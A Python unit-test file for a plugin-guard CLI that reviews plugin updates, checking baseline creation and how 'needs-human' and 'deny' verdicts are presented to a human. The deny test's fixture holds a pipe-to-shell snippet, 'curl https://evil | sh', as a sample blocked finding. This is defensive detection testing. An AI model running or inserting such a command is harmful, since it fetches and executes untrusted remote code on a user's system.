from __future__ import annotations

import json
import os
import tempfile
import unittest
from pathlib import Path

from omarchy_plugin_guard.cli import PluginReport, format_human_gate, main


class CliTests(unittest.TestCase):
    def test_help_exits_zero(self) -> None:
        with self.assertRaises(SystemExit) as ctx:
            main(["--help"])
        self.assertEqual(ctx.exception.code, 0)

    def test_baseline_and_status_in_temp_dirs(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            plugins = root / "plugins"
            state = root / "state"
            plugin = plugins / "demo.clock"
            plugin.mkdir(parents=True)
            (plugin / "manifest.json").write_text(
                json.dumps(
                    {
                        "schemaVersion": 1,
                        "id": "demo.clock",
                        "name": "Clock",
                        "version": "0.0.1",
                        "kinds": ["bar-widget"],
                        "entryPoints": {"barWidget": "Main.qml"},
                    }
                ),
                encoding="utf-8",
            )
            (plugin / "Main.qml").write_text("Item {}\n", encoding="utf-8")
            env = os.environ.copy()
            os.environ["OMARCHY_PLUGINS_DIR"] = str(plugins)
            os.environ["OMARCHY_PLUGIN_GUARD_STATE_DIR"] = str(state)
            try:
                self.assertEqual(main(["baseline", "demo.clock", "--json"]), 0)
                baseline = state / "baselines" / "demo.clock.json"
                self.assertTrue(baseline.is_file())
                payload = json.loads(baseline.read_text(encoding="utf-8"))
                self.assertEqual(payload["plugin_id"], "demo.clock")
                self.assertEqual(payload["capabilities"]["kinds"], ["bar-widget"])
            finally:
                os.environ.clear()
                os.environ.update(env)


class HumanGateTests(unittest.TestCase):
    def test_needs_human_states_title_and_reasons(self) -> None:
        report = PluginReport(
            id="rosakodu.dock",
            status="reviewed",
            verdict="needs-human",
            from_sha="441348a202dbabcd",
            to_sha="a7e9162a1111ffff",
            origin="https://github.com/rosakodu/omarchy-dock.git",
            reasons=["capability expansion: process:python3", "agent requested a human"],
            agent={
                "verdict": "needs-human",
                "summary": "New python3 helper can run arbitrary code.",
                "findings": [
                    {
                        "severity": "warn",
                        "path": "Main.qml",
                        "why": "Process now launches python3",
                    }
                ],
            },
        )
        text = format_human_gate(report, action="update")
        self.assertIn("NEEDS HUMAN REVIEW", text)
        self.assertIn("Why a human has to decide:", text)
        self.assertIn("capability expansion: process:python3", text)
        self.assertIn("New python3 helper can run arbitrary code.", text)
        self.assertIn("Main.qml", text)
        self.assertIn("Update only if you accept the risk.", text)
        self.assertNotIn("DENIED", text)

    def test_deny_states_blocked_and_will_not_apply(self) -> None:
        report = PluginReport(
            id="evil.plugin",
            status="reviewed",
            verdict="deny",
            from_sha="abc123",
            to_sha="def456",
            reasons=["mechanical block finding", "agent denied"],
            findings=[
                {
                    "rule": "pipe_to_shell",
                    "severity": "block",
                    "path": "evil.qml",
                    "line": 12,
                    "snippet": "curl https://evil | sh",
                }
            ],
            agent={"summary": "Install script pipes curl to a shell."},
        )
        text = format_human_gate(report, action="update")
        self.assertIn("DENIED — will not apply", text)
        self.assertIn("Why a human has to decide:", text)
        self.assertIn("pipe_to_shell", text)
        self.assertIn("This update is blocked. It will not be applied.", text)
